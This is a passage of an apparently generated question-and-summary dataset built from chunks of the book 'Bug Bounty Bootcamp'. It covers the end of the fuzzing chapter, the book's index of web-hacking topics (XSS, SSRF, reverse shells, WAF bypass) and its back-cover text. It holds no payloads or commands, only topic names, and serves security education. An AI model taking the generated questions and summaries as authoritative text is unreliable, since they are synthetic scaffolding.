classes of bugs that fuzzing can find.\nAlthough fuzzing is good at finding certain basic vulnerabilities like XSS\nand SQL injection, and can sometimes aid in the discovery of new bug\ntypes, it isn’t much help in detecting business logic errors, or bugs that\nrequire multiple steps to exploit. These complex bugs are a big source of\npotential attacks and still need to be teased out manually. While fuzzing\nshould be an essential part of your testing process, it should by no means be\nthe only part of it.\nAdding to Your Automated Testing Toolkit\nAutomated testing tools like fuzzers or scanners can help you discover\nsome bugs, but they often hinder your learning progress if you don’t take\nthe time to understand how each tool in your testing toolkit works. Thus,\nbefore adding a tool to your workflow, be sure to take time to read the\ntool’s documentation and understand how it works. You should do this for\nall the recon and testing tools you use.\nBesides reading the tool’s documentation, I also recommend reading\nits source code if it’s open source. This can teach you about the methodolo-\ngies of other hackers and provide insight into how the best hackers in the\nfield approach their testing. Finally, by learning how others automate hack-\ning, you’ll begin learning how to write your own tools as well.\nHere’s a challenge for you: read the source code of the tools Sublist3r\n(https://github.com/aboul3la/Sublist3r/) and Wfuzz (https://github.com/xmendez/\nwfuzz/). These are both easy-to-understand tools written in Python. Sublist3r\nis a subdomain enumeration tool, while Wfuzz is a web application fuzzer.\nHow does Sublist3r approach subdomain enumeration? How does Wfuzz\nfuzz web applications? Can you write down their application logic, starting\nfrom the point at which they receive an input target and ending when they\noutput their results? Can you rewrite the functionalities they implement\nusing a different approach?\nOnce you’ve gained a solid understanding of how your tools work, try to\nmodify them to add new features! If you think others would find your feature\nuseful, you could contribute to the open source project: propose that your\nfeature be added to the official version of the tool.\nUnderstanding how your tools and exploits work is the key to becoming\na master hacker. Good luck and happy hacking!\nAutomatic Vulnerability Discovery Using Fuzzers 379",
    "question": "How can fuzzing be used to automatically discover vulnerabilities in web applications, and what are the key steps involved in the fuzzing process?",
    "summary": "Fuzzing is a powerful technique for automatically discovering vulnerabilities in web applications by sending invalid data and monitoring the application's responses. Tools like Burp Intruder and Wfuzz can be used to test for common vulnerabilities such as SQL injection, XSS, and IDOR. While fuzzing is efficient for finding certain types of bugs, it should be combined with manual testing and other methods to ensure comprehensive security assessments."
  },
  {
    "start": 263,
    "end": 263,
    "text": "INDE X\nSymbols Android, 335, 347–354\n../, 279, 287, 325 Android Debug Bridge (ADB), 351\n.bash_profile, 81 Android Package (APK), 350\n/etc/passwd, 252, 291 Activities, 350\n/etc/shadow, 177, 249, 253–260, 279, 332 AndroidManifest.xml, 350\n.git directory, 328–330. See also Git assets, 351\nannotated tags, 330 BroadcastReceivers, 350\nblobs, 330 classes.dex, 351\ncommits, 330 ContentProviders, 350\ntrees, 330 lib, 351\nMANIFEST.MF, 351\nA META-INF, 351\naccess control, 43, 175, 177–178, 278, res, 351\n324, 364–365. See also resources.arsc, 351\nbroken access control res/values/strings.xml, 354\naccess tokens, 312–316, 364–365 Services, 350\nlong-lived tokens, 316 Android Studio, 352\naccount takeover, 172, 185, 321 developer options, 352\nactive scanning, 69. See also passive Apache\nscanning Apache Cassandra, 199\nADB. See Android Debug Bridge (ADB) Apache Commons FileUpload, 243\nadmin panels, 70–71, 278, 321 Apache CouchDB, 199\nAFL. See American Fuzzy Lop (AFL) Apache Groovy, 243\nalert box, 116, 122–126 APIs. See application programming\nallowlist, 133, 141, 194, 215, 220–221. interfaces (APIs)\nSee also blocklist APK. See Android Package (APK)\nAltdns, 69 Apktool, 352\nAmass, 68 application logic errors, 275–281, 379.\nAmazon Elastic Compute Cloud (EC2), See also business logic\n77, 226. See also Amazon Web vulnerabilities\nServices (AWS) application programming interfaces\nAmazon S3, 74–77, 226. See also (APIs), 6, 34, 355–367\nAmazon Web Services (AWS) API-centric applications, 361\nLazys3, 74 API enumeration, 362\nS3 buckets, 61, 64, 74 API keys, 75, 226\nAmazon Web Services (AWS), 61, 75, apt-get, 219\n308, 316 ASCII, 126–127, 138–140, 293\nawscli, 75 ASNs. See autonomous systems (ASNs)\nAmerican Fuzzy Lop (AFL), 370 asset, 4. See also scope\nattack scenarios, 19 intruder, 54, 129, 370, 372\nattack surface, 5–6, 25, 61–62, 104, 309 repeater, 56\nauthentication app, 276 SQLiPy, 203\nauthentication keys, 62 business impact, 17, 27, 104, 379. See\nauthorization code, 276, 314 also business priorities\nautomated testing toolkit, 379 business logic vulnerabilities, 276. See\nautomation strategies, 318 also application logic errors\nautonomous systems (ASNs), 67 business priorities, 17, 27. See also\nAWS. See Amazon Web Services (AWS) business impact\nAyrey, Dylan, 339 business requirements, 279\nB C\nbash script, 62, 80–104, 372 CA. See certificate authority (CA)\nbasic authentication, 376 capitalization, 126\nBig List of Naughty Strings, 372 CAPTCHA, 65\nbillion laughs attack, 258. See also Capture the Flag, 12, 28\nXML bomb Cascading Style Sheets (CSS), 34, 147\nBitbucket, 316 opacity, 148\nbitly.com, 119 z-index, 147\nblack-box testing, 336. See also gray-box cat command, 92\ntesting, white-box testing CDATA. See character data (CDATA)\nblocklist, 126, 133, 215. See also allowlist Censys, 67, 70, 104\nbroken access control, 275–281, 364. See central processing units (CPUs), 206\nalso access control certificate authority (CA), 50\nbrute-forcing, 42, 54, 70–71, 376–377 certificate parsing, 67\ndirectory brute-forcing, 62, 70–71 certificate pinning, 349–350, 353\nURL brute-forcing, 278 cert pinning. See certificate pinning\nbug bounty character data (CDATA), 259\nbug bounty hunter, 3 chmod, 82\nbug bounty platforms, 8 clickjacking, 143–154, 163–165\nbug bounty program, 3–4 client, 34. See also server\nnotes, 58 client IDs, 313–315\nprivate programs, 11 Cloud computing, 226\nbug chains, 27 CNAME, 308\nBugcrowd, 4, 8, 17 dangling CNAMEs, 309\nbug slump, 27 Cobalt, 4, 8\nbuilt-in functions, 270–272, 288 Codecademy, 44, 80\nBuiltWith, 79, 104 code injection, 283. See also command\nBurp, 39, 47–58 injection, RCE\nAuthMatrix, 185 command injection, 285, 343. See also\nAuto Repeater, 185 code injection, RCE\nAutorize, 185 command substitution, 84, 101, 292\nBAppStore, 185 Common Vulnerabilities and\nBurp Suite Pro, 47, 219 Exposures (CVEs), 78, 281,\nCollaborator, 219 332, 340\ncomparer, 58 Common Vulnerability Scoring System\ncrawler, 72 (CVSS), 17\ndecoder, 39, 57 concurrency, 206\n382 Index\nconfidentiality, 312 DigitalOcean, 227\nconfiguration files, 70 directory enumerator, 370\nCORS. See Cross-Origin Resource directory traversal, 43, 177, 279, 325. See\nSharing (CORS) also path traversal\nCPUs. See central processing units DNS. See Domain Name System (DNS)\n(CPUs) DOCTYPE, 248\nCron, 102–103, 318 document.cookie, 115\ncrontabs, 102–103 Document Object Model (DOM),\nCross-Origin Resource Sharing 117–118\n(CORS), 297–298, 302–306 document type definition (DTD),\ncross-site request forgery (CSRF), 128, 248–250, 253–260\n152, 155–174 DOM. See Document Object Model\ncross-site scripting (XSS), 111–129, 308 (DOM)\nCSRF. See cross-site request domain name, 33. See also hostname\nforgery (CSRF) Domain Name System (DNS), 34–35\ncryptography, 6–7, 339 DNS records, 222\nweak cryptography, 339 AAAA records, 222\nCSS. See Cascading Style Sheets (CSS) A records, 222\nCTF. See Capture the Flag DNS zone transfers, 68\nCTF Wiki, 273 domain privacy, 66\ncurl, 87, 211, 366 domain registrar, 65, 223\nCVEs. See Common Vulnerabilities and DoS. See Denial-of-Service Attacks\nExposures (CVEs) (DoS)\nCVE database, 340 DTD. See document type definition\nCVSS. See Common Vulnerability (DTD)\nScoring System (CVSS)\nE\nCyberChef, 39\nCyrillic, 140 EC2. See Amazon Elastic Compute\nCloud (EC2)\nD\nECB, 339\nDamn Vulnerable Web Application, 203 echo command, 83\ndata:, 122, 138 EdOverflow, 125, 317\ndatabase, 188 Eloquent JavaScript, 44\ndata entry points, 371 embedded browser, 47, 50\ndata exfiltration, 259 emulator, 6, 348–349, 352–353\ndata injection points, 371 mobile emulator, 348–349\ndebugging mode, 351 encoding\ndebug messages, 64 base64 encoding, 38, 138, 181\nDenial-of-Service Attacks (DoS), 10, content encoding, 38\n200, 258 decimal encoding, 223\nReDoS, 63 double encoding, 139\ndependencies, 76, 250, 288, 340 double word (dword) encoding,\noutdated dependencies, 76, 340 223–224\ndescriptive error, 196, 257, 266, 268 hex encoding, 38, 223\ndeserialization, 231–246 mixed encoding, 223\ndeveloper comments, 324, 328, 331, octal encoding, 223\n340, 345 URL decoding, 138\ndeveloper tools, 129 URL encoding, 38, 138, 181, 223\nIndex 383\nencryption, 312, 338–339, 353 GitHub, 75, 316\nentropy, 77, 159, 182, 339 GitHub gists, 327\nERB. See Embedded Ruby template GitHub Pages, 308–309, 317\n(ERB) repositories, 75\nescaping, 119 Gitleaks, 328\nescape character, 101, 119, 293 Gitrob, 77\noutput escaping, 119 Global Regular Expression Print\neval, 284–285, 336–338 (grep), 88–89\nevent listener, 298–300, 302–303, 305 GoDaddy, 219\nonclick, 122 Google Cloud, 226–227, 316\nonerror, 122 Google dorking, 62, 65, 74, 134, 278\nonload, 122 Google Hacking Database, 65\nexecutable, 7 Graphical User Interface (GUI), 373\nExtensible Markup Language (XML), GraphQL, 179, 358–365\n247–260, 309, 357–358 Clairvoyance, 362\nexternal entities, 248 introspection, 360-361\nparameter entities, 256 __schema, 360\nXML entities, 248 __type, 361\nXML parsers, 247 mutations, 359\nEyeWitness, 71, 316 queries, 359\nPlayground, 362\nF\ngray-box testing, 336. See also black-box\nfile inclusion, 286–287 testing, white-box testing\nlocal file inclusions, 287 grep. See Global Regular Expression\nremote file inclusion, 286 Print (grep)\nFile Transfer Protocol (FTP), 260 GUI. See Graphical User Interface\nfilter bypass, 128, 293 (GUI)\nfingerprinting, 78\nFirefox, 46–52, 124, 160–161 H\nFlash, 111 hacker blogs, 28\nFrida, 350, 353 HackerOne, 4, 8, 11, 17, 111, 233\nObjection, 350 Hacktivity, 209\nUniversal Android SSL Pinning hacking, 61\nBypass, 350 hacking environment, 45\nFTP. See File Transfer Protocol (FTP) HackTricks, 273\nfuzzing, 125, 195, 363, 370–379 hardcoded secrets, 76, 338–339, 354\nFuzzDB, 372 hardware, 7\nfuzzers, 369–379 hashing, 177\nweb application fuzzing, 370 Haverbeke, Marijn, 44\nG HMAC, 42\nHostinger, 219\ngadgets, 238, 243–245\nhostname, 67, 296. See also domain\ngadget chains, 243–245\nname\ngetopts, 92–98\nHTML. See Hypertext Markup\nGit, 328\nLanguage (HTML)\nBlame, 76\nHTTP. See HyperText Transfer Protocol\ngit diff, 103\n(HTTP)\nHistory, 76\nHttpOnly, 115, 120\nIssues, 76\n384 Index\nHypertext Markup Language input redirection, 83\n(HTML), 34 input validation, 119–120, 250, 288,\nHTML tag, 123 291, 293, 366\nHyperText Transfer Protocol (HTTP), insecure deserialization, 231–246,\n36–39 337–338, 366–367\ncookies, 39 insecure direct object references\ncookie sharing, 308 (IDORs), 175–186, 353–354\ndouble-submit cookie, 167 blind IDORs, 183\nrequest headers, 36 read-based IDORs, 184\nAuthorization, 36, 376 write-based IDORs, 184\nCookie, 36 instance metadata, 226–229, 255\nHost, 36 integrated development environment\nOrigin, 297 (IDE), 59\nReferer, 36 internal network, 214. See also private\nUser-Agent, 36, 377 network\nrequest methods, 183 internal domains, 66\nresponse bodies, 37, 324 internet, 33\nresponse headers, 37, 151, 324 internet security controls, 38\nAccess-Control-Allow-Origin, Internet Engineering Task Force\n37, 297–298, 302–305 (IETF), 222\nContent-Security-Policy, 37, Internet of Things (IoT), 5, 7, 122, 347,\n120, 149, 151 358\nContent-Type, 37, 242, 251 Internet Protocol (IP), 34\nframe-ancestors, 149 IPv4, 34\nLocation, 37 IPv6, 34, 222\nSet-Cookie, 37, 150, 156 IP addresses, 65–66\nX-Frame-Options, 37, 149, 151, IP range, 66\n153–154 reserved IP addresses, 218\nresponse times, 9 Intigriti, 4, 8\nstatus code, 36, 219 iOS, 348, 350, 353\nIoT. See Internet of Things (IoT)\nI\nIP. See Internet Protocol (IP)\nidentity assertion, 309–312\nJ\nidentity provider, 309–314, 316, 319\nIDE. See integrated development java.io.Serializable, 241\nenvironment (IDE) readObject(), 241–242, 244\nIDORs. See insecure direct object writeObject(), 241\nreferences (IDORs) javascript:, 122–126\nIETF. See Internet Engineering Task JavaScript (JS), 34, 44, 111, 353\nForce (IETF) Angular, 120\niframe, 144–154, 158, 160, 163–164, fromCharCode(), 126\n298–299, 304 Jenkins, 69\ndouble iframe, 152 jq, 90–91\nframe-busting, 151–152 jQuery, 118\ninformation leaks, 170, 226, 229, js.do, 127\n295, 312, 324, 331–332, 354, React, 120\n363–365 Retire.js, 180\ninline scripts, 113–114 Vue.js, 120\nIndex 385\nJS. See JavaScript (JS) multifactor authentication (MFA),\nJSON, 68, 184, 234, 357 276–277, 280\nJSONP. See JSON with Padding multithreading, 206\n(JSONP) MySQL, 188, 196, 198, 201\nJSON Web Tokens (JWT), 41–43\nN\nalg field, 42\nheader, 41 Namecheap, 223\nJSON with Padding (JSONP), 300–302, Netcat, 219\n305–306. See also JSON NetRange, 66\nJWT. See JSON Web Tokens (JWT). See network perimeter, 214\nalso JSON network scanning, 215, 224–228\nNoSQL, 188, 199–201\nK\nNoSQL injections, 199–201\nKali Linux, 46 NoSQLMap, 200\nKeyHacks, 76 nslookup, 66, 222\nKibana, 64 NULL origin, 297–298, 303–305\nKubernetes, 227\nO\nL\nOAuth, 141, 312–316, 320–321\nLearn Python the Hard Way, 44\nredirect_uri, 313–316\nLinkFinder, 331\nobject-oriented programming\nLinux, 62\nlanguages, 234\nlocalhost, 218\nObsidian, 59\nlow-hanging fruit, 25\nOffensive Security, 120\nM open redirect, 131–141, 221, 314–316,\nmacOS, 62 338, 342–343\nman, 96 open redirect chain, 315\nman-in-the-middle attacks, 349 parameter-based open redirects, 135\nMarkdown, 59 referer-based open redirects, 132,\nMasscan, 69 135\nMD4, 339 operating system, 46, 62\nMD5, 339 OSINT, 77\nmemory leaks, 370 outbound requests, 228, 249, 252\nmethodology, 25, 27 out-of-band interaction, 289\nMFA. See multifactor authentication out-of-band techniques, 219\n(MFA) output redirection, 83–84\nMiessler, Daniel, 372 OWASP, 28, 72\nmind-mapping, 59 Code Review Guide, 336\nmitigation process, 19–21 Dependency-Check tool, 340\nmkdir, 83 Deserialization Cheat Sheet, 244\nmobile applications, 6 IoTGoat, 122\nmobile hacking, 347–354 Mobile Security Testing Guide, 348\nMobile Security Framework, 353 SQL injection prevention cheat\nMongoDB, 199 sheet, 195\nmonitoring system, 318 Web Security Testing Guide, 367\nXSS filter evasion cheat sheet, 128\nXSS prevention cheat sheet, 120\n386 Index\nP programming, 44\nexpression, 262\nparameterized queries, 192. See also\nfor loop, 93\nprepared statements\nfunction library, 96\nparent directory, 279, 325\nfunctions, 87\npassive scanning, 69–70. See also active\nif-else statements, 86\nscanning\ninteractive programs, 97\npassword-cracking, 269\nstatement, 262\nPastebin, 77–78, 324, 327–328\nwhile loop, 98\npastebin-scraper, 328\nProject Sonar, 70\nPasteHunter, 78, 328\nproof of concept (POC), 18\npaste dump sites, 327\nPOC generation, 174\npath enumeration, 374–375\nproperty-oriented programming chain,\npath traversal, 177, 279, 325, 366–367.\n238–239\nSee also directory traversal\nprotocol, 43, 120, 296, 325\nPATH variable, 81\nproxy, 46, 52, 72, 348\npattern matching, 89\nproxy services, 216\npayload, 41, 54, 154\nweb proxy, 45\npayouts, 9–11\npublicly disclosed reports, 25. See also\nPeriscope, 153\nwrite-up\npermissions, 178\npublicly disclosed vulnerabilities, 324\npermutations, 69, 74–75\nPython, 44, 244–245, 262–273, 289–292\nphishing, 129, 132, 140, 309\ndictionary, 272\nPHP, 61, 70–71, 232–241\nobject, 270\nExtendsClass, 232\ninstantiation, 235, 239 Q\nmagic methods, 235–238\nQuora, 77\nobject injection vulnerabilities,\n233, 238 R\nunserialize(), 235 race conditions, 205–212, 366, 370\nwrappers, 259 randomization, 178\nphpmyadmin, 70, 79 rate-limiting, 365–366, 378\nPHPSESSID, 79 RCE. See remote code execution (RCE)\nPOC. See proof of concept reachable machines, 224\nPOP chain. See property-oriented recon. See reconnaissance\nprogramming chain reconnaissance, 25, 61–107, 243, 360, 369\npop-up, 154 recon APIs, 104\nport, 35 referer, 132–135, 141–163, 168–169, 315\nport number, 35, 296 regex. See regular expression\nport scanning, 62, 69 regular expression, 77, 88–90, 221, 298,\nPostman, 362 338–339\npostMessage(), 298–306 constants, 89\nprepared statements, 192–194 operators, 89\nprinciple of least privilege, 201, 210, 288 RexEgg, 90\nprivate network, 218. See also internal remote code execution (RCE), 236–237,\nnetwork 283–293, 337\nProgrammer Help, 273 blind RCEs, 288\nclassic RCEs, 288\nIndex 387\nreport states, 21 Secure Sockets Layer (SSL), 67, 349\nduplicate, 22 Security Assertion Markup Language\ninformative, 22 (SAML), 309\ninvalid reports, 26 SAML Raider, 320\nlow-severity bug, 26 SAML signature, 311\nmediation, 23 security context, 302\nN/A, 22 security patches, 340\nneed more information, 22 security program, 4\nresolved, 23 sensitive data leaks, 312\ntriaged, 22 sensitive information, 324\nRepresentational State Transfer serialization, 232. See also deserialization\n(REST), 357 serialized string, 233\nresource locks, 210 server, 34, 79. See also client\nREST. See Representational State server logs, 64\nTransfer (REST) server status, 64\nreturn-oriented programming, 241 server-side request forgery (SSRF),\nreverse engineering, 6 213–229, 278\nreverse shell, 285 blind SSRF, 214\nrooted device, 6 server-side template injections (SSTIs),\nRSA, 42 261–274\nserver-side vulnerabilities, 6\nS\nservice banner, 218\nS3. See Amazon S3 service enumeration, 69\nsafe concurrency, 206 service provider, 309\nsame-origin policy (SOP), 43, 295–306 session, 39–40\nSameSite, 149–152, 159–160 session cookie, 115, 156–160,\nSAML. See Security Assertion Markup 162–172, 308–309, 318–321.\nLanguage (SAML) See also session ID\nsandbox session ID, 39. See also session\nsandbox environment, 265–166 cookie\nsandbox escape, 269–273 session management, 39\nsanitizing, 114 Shaw, Zed, 44\nSAST. See static analysis security shebang, 80\ntesting (SAST) shell\nSCA. See software composition commands, 285\nanalysis (SCA) interpreter, 62\nscanner, 72 Shopify, 359\nscheduling, 206 signature, 40–43, 311–312, 319–321, 351\nscope, 9–13, 26 single sign-on (SSO), 307–321\nscope discovery, 65 shared-session SSO, 308–309\nsearch engine, 63 SlideShare, 77\nSecLists, 68, 372 Snapper, 71, 316\nsecret-bridge, 325 SOAP, 358\nsecret key, 40 social engineering, 119, 132\nsecret storage system, 325 Social-Engineer Toolkit, 154\nSecure Shell Protocol (SSH), 218, 225, software composition analysis (SCA), 340\n227 software supply chain attack, 288\n388 Index\nSOP. See same-origin policy (SOP) Subject Alternative Name, 67–68\nsource code review, 76, 328, Sublime Text, 59\n335–346, 351, 378. See also superdomain, 296\nstatic analysis security testing SVG, 253\n(SAST), static code analysis Swagger, 363\nsource command, 96 Synack, 4, 8\nspidering, 62, 71 synchronization, 210\nSpring Framework, 243 syntax error, 123\nSQL. See Structured Query Language system root, 279\n(SQL)\nT\nSQL injections, 187–203\nblind, 188, 195 technology stack, 6, 69, 78–79, 104\nBoolean based, 196 template engines, 261–266\nclassic, 188, 195 Embedded Ruby template\nerror based, 195 (ERB), 266\nfirst-order, 191 FreeMarker, 266\ninferential, 196 Jinja, 262\nout-of-band, 188, 195 Smarty, 266\nsecond-order, 191 Thymeleaf, 266\ntime based, 197 Twig, 266\nUNION based, 195 template injections. See server-side\nsqlmap, 202 template injections (SSTIs)\nSquarespace, 316 test command, 95\nSSH. See Secure Shell Protocol (SSH) testing guides, 28\nSSL. See Secure Sockets Layer (SSL) third-party service, 308\nSSL pinning. See certificate pinning threads, 206\nSSO. See single sign-on (SSO) time-of-check/time-of-use vulnerabilities.\nSSRF. See server-side request See race conditions\nforgery (SSRF) time throttling, 366, 373–374\nSSRFmap, 220 token-based authentication, 40\nSSTIs. See server-side template token forgery, 40\ninjections (SSTIs) Tomnomnom, 78\nStack Overflow, 77 tplmap, 273\nstate-changing action, 149, 161 triage, 8–9\nstatic analysis security testing (SAST), truffleHog, 77, 328, 339\n346. See also source code tuple, 270\nreview, static code analysis Tutorials Point, 232\nstatic code analysis, 378. See also source Twitter, 356\ncode review, static analysis\nU\nsecurity testing (SAST)\nStructured Query Language (SQL), Unarchiver, 253\n187–188 unexpected behavior, 370\nSubBrute, 68 Unicode, 140\nsubdomain, 64–65 Unix, 46, 81, 100–102, 177, 249, 279,\nsibling subdomains, 296 290, 292, 325, 372\nsubdomain enumeration, 68–69, 379 Unrouted addresses, 228\nsubdomain takeovers, 308–309, URLs, 63\n316–318 absolute URL, 133–134, 325\nIndex 389\ncomponents of, 136 wget, 285, 329\ninternal URLs, 218 white-box testing, 336. See also black-\nmangled URLs, 136 box testing, gray-box testing\nrelative URLs, 133, 325 whoami, 289\nURL fragments, 118, 121, 266 whois, 65\nURL validation, 133, 136 reverse whois, 65\nUSB debugging, 351 whois.cymru.com, 67\nuser input, 342 Wikipedia, 63\nuser-interface redressing, 143. See also wildcard, 63, 101, 292, 297–299\nclickjacking Windows 353\nWordPress, 7, 79, 280\nV\nwrite-up, 28\nvalidating, 114\nWSDL. See Web Services Description\nVault, 325\nLanguage (WSDL)\nVBScript, 111\nX\nVDPs. See vulnerability disclosure\nprograms (VDPs) XInclude Attacks, 251, 254\nViewDNS.info, 66 XMind, 59\nView Source Code, 79 XML. See Extensible Markup Language\nvirtual environment, 352 (XML)\nvulnerabilities, 61 XML bomb, 258. See also billion laughs\nvulnerability disclosure programs attack\n(VDPs), 10 XML external entity (XXE), 247–260\nvulnerability report, 16. See also write-up blind XXE, 252\nseverity, 16 classic XXE, 251\nsteps to reproduce, 18 XMLHttpRequest, 128, 170\nvulnerability scanners, 25 XmlLint, 259\nX-Powered-By, 79, 324\nW\nXSS, 111–129\nW3Schools, 188\nblind XSS, 116, 125\nWAF. See web application firewall\nreflected XSS, 117, 343\n(WAF)\nself-XSS, 119, 171\nWappalyzer, 79\nstored XSS, 115\nWayback Machine, 326\nXSS filter, 126\nWaybackurls, 78\nXSS Hunter, 125\nweb application firewall (WAF), 288\nXSS polyglot, 124\nWAF bypass, 293\nXSS protection, 126\nweb applications, 5\nXXE. See XML external entity (XXE)\nweb browser, 46\nY\nweb crawling, 71, 326\nweb frameworks, 187 YAML, 234, 338\nWebhooks, 216 Ysoserial, 243\nweb-hosting service, 223\nZ\nweb page, 34\nWeb Services Description Language ZAP. See Zed Attack Proxy (ZAP)\n(WSDL), 358, 362 Zed Attack Proxy (ZAP), 47, 72–73, 174,\nweb shell, 202 362, 374\nweb spidering, 62, 71 zip command, 254\nWfuzz, 370–371, 374–379 zlib, 331\n390 Index\nRESOURCES\nVisit https://nostarch.com/bug-bounty-bootcamp/ for errata and more information.\nMore no-nonsense books from NO STARCH PRESS\nREAL-WORLD BUG HUNTING HOW TO HACK LIKE A GHOST ATTACKING NETWORK PROTOCOLS\nA Field Guide to Web Hacking Breaching the Cloud a hacker’s guide to caPture, analysis,\nby peter yaworski by sparc flow and exPloitation\n264 pp., $39.95 264 pp., $34.99 by james forshaw\nisbn 978-1-59327-861-8 isbn 978-1-71850-126-3 336 pp., $49.95\nisbn 978-1-59327-750-5\nPRACTICAL IOT HACKING BLACK HAT PYTHON, 2ND EDITION WEB SECURITY FOR DEVELOPERS\nthe definitive guide to attacking Python Programming for hackers and Pentesters by malcolm mcdonald\nthe internet of things by justin seitz and tim arnold 216 pp., $29.95\nby fotios chantzis, ioannis 216 pp., $44.99 isbn 978-1-59327-994-3\nstais, paulino calderon, isbn 978-1-71850-112-6\nevangelos deirmentzoglou,\nbeau woods\n464 pp., $49.99\nisbn 978-1-71850-090-7\nphone: email:\n800.420.7240 or sales@nostarch.com\n415.863.9900 web:\nwww.nostarch.com\n“The foundation you need to\nmake it in bug bounties.”\n—Ben Sadeghipour, Head of Hacker\nEducation at HackerOne\nA comprehensive guide for any web application Configure Burp Suite to intercept traffic\nhacker, Bug Bounty Bootcamp explores and hunt for bugs\nthe many vulnerabilities in modern web\napplications and the hands-on techniques you Chain together multiple bugs for\ncan use to successfully exploit them. By the end maximum impact and higher payouts\nof the book, you’ll be ready to reap the rewards of\nBypass protection mechanisms like input\nthe bug bounty programs that companies create\nsanitization and blocklists\nto identify vulnerabilities in their applications.\nAutomate tedious bug-hunting tasks with\nYour bootcamp begins with guidance\nfuzzing and bash scripting\non writing high-quality bug reports and\nbuilding lasting relationships with client Set up an Android app testing environment\norganizations. You’ll then set up a hacking\nlab and dive into the mechanisms of common Thousands of data breaches happen every\nweb vulnerabilities like XSS and SQL injection, year. By understanding vulnerabilities and\nlearning what causes them, how to exploit how they happen, you can help prevent\nthem, where to find them, and how to bypass malicious attacks, protect apps and users,\nprotections. You’ll also explore strategies for and make the internet a safer place. Happy\ngathering intel on a target and automate recon hacking!\nwith bash scripting. Finally, you’ll practice\nadvanced techniques like hacking mobile apps, About the Author\ntesting APIs, and reviewing source code for\nvulnerabilities.\nVICKIE LI is a developer and security researcher\nwho has reported web vulnerabilities to\nAlong the way, you’ll learn how to:\norganizations such as Facebook, Yelp, and\nIdentify and successfully exploit a wide Starbucks. She contributes to a number of\narray of common web vulnerabilities online training programs and technical blogs.\nTHE FINEST IN GEEK ENTERTAINMENT™ $49.99 ($65.99 CDN)\nLi\nwww.nostarch.com",
    "question": "What are the key techniques and strategies discussed in the text for identifying and exploiting common web vulnerabilities in a bug bounty program?",
    "summary": "Bug Bounty Bootcamp is a comprehensive guide for web hackers, covering common vulnerabilities and exploitation techniques. It teaches how to identify and exploit issues like XSS and SQL injection, bypass protections, and automate bug-hunting tasks. The book also provides strategies for writing effective bug reports and building relationships with organizations to report vulnerabilities. Vickie Li, a developer and security researcher, shares her experience in reporting bugs to major companies and contributing to security education."
  }
]